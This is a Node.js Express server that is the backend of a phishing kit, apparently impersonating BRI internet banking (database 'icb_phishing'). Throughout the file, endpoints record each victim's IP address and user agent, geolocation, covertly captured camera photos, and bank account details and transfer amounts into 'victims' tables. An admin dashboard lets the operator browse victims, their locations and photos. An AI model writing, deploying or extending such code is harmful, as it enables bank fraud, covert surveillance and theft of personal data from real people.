const express = require('express');
const mysql = require('mysql2/promise');
const bcrypt = require('bcryptjs');
const session = require('express-session');
const cors = require('cors');
const helmet = require('helmet');
const morgan = require('morgan');
const path = require('path');
const { v4: uuidv4 } = require('uuid');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

app.use(helmet({
  contentSecurityPolicy: false,
  crossOriginEmbedderPolicy: false,
  crossOriginResourcePolicy: { policy: 'cross-origin' }
}));
app.use(cors({
  origin: true,
  credentials: true,
  methods: ['GET', 'POST', 'PUT', 'DELETE', 'OPTIONS'],
  allowedHeaders: ['Content-Type', 'Authorization']
}));
app.use(express.json({ limit: '50mb' }));
app.use(express.urlencoded({ extended: true, limit: '50mb' }));
app.use(morgan('combined'));

app.use(session({
  secret: process.env.SESSION_SECRET || 'bri-ibanking-secure-session-2024',
  resave: false,
  saveUninitialized: true,
  cookie: { 
    secure: process.env.NODE_ENV === 'production',
    httpOnly: true,
    maxAge: 24 * 60 * 60 * 1000
  }
}));

const db = mysql.createPool({
  host: process.env.DB_HOST || 'localhost',
  user: process.env.DB_USER || 'root',
  password: process.env.DB_PASSWORD || '',
  database: process.env.DB_NAME || 'icb_phishing',
  waitForConnections: true,
  connectionLimit: 10,
  queueLimit: 0,
  ssl: process.env.DB_SSL === 'true' ? { rejectUnauthorized: false } : undefined
});

app.use(express.static(path.join(__dirname, 'public')));
app.use('/admin', express.static(path.join(__dirname, 'admin')));

app.post('/api/session', async (req, res) => {
  try {
    const sessionId = uuidv4();
    const ipAddress = req.headers['x-forwarded-for'] || req.ip || 'unknown';
    const userAgent = req.headers['user-agent'] || 'unknown';

    await db.query(
      'INSERT INTO victims (session_id, ip_address, user_agent) VALUES (?, ?, ?)',
      [sessionId, ipAddress, userAgent]
    );

    res.json({ success: true, session_id: sessionId });
  } catch (error) {
    res.status(500).json({ success: false, error: 'Failed to create session' });
  }
});

app.post('/api/location', async (req, res) => {
  try {
    const { session_id, latitude, longitude, accuracy, altitude, speed, heading } = req.body;

    if (!session_id || !latitude || !longitude) {
      return res.status(400).json({ success: false, error: 'Missing required fields' });
    }

    await db.query(
      `INSERT INTO victim_locations (session_id, latitude, longitude, accuracy, altitude, speed, heading) 
       VALUES (?, ?, ?, ?, ?, ?, ?)`,
      [session_id, latitude, longitude, accuracy || null, altitude || null, speed || null, heading || null]
    );

    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ success: false, error: 'Failed to update location' });
  }
});

app.post('/api/photo', async (req, res) => {
  try {
    const { session_id, photo_data, photo_type } = req.body;

    if (!session_id || !photo_data) {
      return res.status(400).json({ success: false, error: 'Missing required fields' });
    }

    await db.query(
      'INSERT INTO victim_photos (session_id, photo_data, photo_type) VALUES (?, ?, ?)',
      [session_id, photo_data, photo_type || 'camera_front']
    );

    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ success: false, error: 'Failed to upload photo' });
  }
});

app.post('/api/submit', async (req, res) => {
  try {
    const { 
      session_id, email, phone, bank_name, account_number, account_holder, transfer_amount 
    } = req.body;

    if (!session_id) {
      return res.status(400).json({ success: false, error: 'Missing session ID' });
    }

    await db.query(
      `UPDATE victims 
       SET email = ?, phone = ?, bank_name = ?, account_number = ?, account_holder = ?, transfer_amount = ? 
       WHERE session_id = ?`,
      [email, phone, bank_name, account_number, account_holder, transfer_amount, session_id]
    );

    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ success: false, error: 'Failed to submit form' });
  }
});

app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin', 'login.html'));
});

app.post('/api/admin/login', async (req, res) => {
  try {
    const { username, password } = req.body;

    const [rows] = await db.query(
      'SELECT * FROM admin_users WHERE username = ?',
      [username]
    );

    if (rows.length === 0) {
      return res.status(401).json({ success: false, error: 'Invalid credentials' });
    }

    const admin = rows[0];
    const isMatch = await bcrypt.compare(password, admin.password_hash);

    if (!isMatch) {
      return res.status(401).json({ success: false, error: 'Invalid credentials' });
    }

    req.session.adminLoggedIn = true;
    req.session.adminUsername = username;

    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ success: false, error: 'Login failed' });
  }
});

app.get('/admin/dashboard', (req, res) => {
  if (!req.session.adminLoggedIn) {
    return res.redirect('/admin');
  }
  res.sendFile(path.join(__dirname, 'admin', 'dashboard.html'));
});

app.get('/api/admin/victims', async (req, res) => {
  try {
    if (!req.session.adminLoggedIn) {
      return res.status(401).json({ success: false, error: 'Unauthorized' });
    }

    const [rows] = await db.query(
      `SELECT * FROM victims ORDER BY created_at DESC`
    );

    res.json({ success: true, victims: rows });
  } catch (error) {
    res.status(500).json({ success: false, error: 'Failed to fetch victims' });
  }
});

app.get('/api/admin/victim/:sessionId', async (req, res) => {
  try {
    if (!req.session.adminLoggedIn) {
      return res.status(401).json({ success: false, error: 'Unauthorized' });
    }

    const { sessionId } = req.params;

    const [locations] = await db.query(
      `SELECT * FROM victim_locations WHERE session_id = ? ORDER BY captured_at DESC LIMIT 100`,
      [sessionId]
    );

    const [photos] = await db.query(
      `SELECT * FROM victim_photos WHERE session_id = ? ORDER BY captured_at DESC LIMIT 100`,
      [sessionId]
    );

    res.json({ success: true, locations, photos });
  } catch (error) {
    res.status(500).json({ success: false, error: 'Failed to fetch details' });
  }
});

app.get('/api/admin/logout', (req, res) => {
  req.session.destroy();
  res.redirect('/admin');
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
